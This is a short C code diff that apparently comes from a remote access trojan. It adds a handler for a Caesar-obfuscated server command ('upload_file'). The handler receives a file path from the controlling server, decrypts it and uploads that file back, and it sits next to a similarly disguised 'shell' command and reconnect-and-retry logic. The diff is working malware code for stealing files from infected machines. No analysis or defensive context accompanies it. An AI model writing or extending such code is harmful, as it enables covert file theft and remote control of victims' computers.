@@ -346,7 +346,20 @@ retry:
 		}
 
 		if (Api.strncmp(server_reply, "zuqtfidknqj", strlen("zuqtfidknqj")) == 0) { //upload_file
+			char* path = (char*)Api.malloc(MAX_PATH);
 
+			//Receive a reply from the server
+			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
+			{
+				//recv failed
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			upload_file(sock, CAESAR_DECRYPT(path));
+
+			Api.free(path);
 		}
 
 		if (Api.strncmp(server_reply, "xmjqq", strlen("xmjqq")) == 0) { //shell
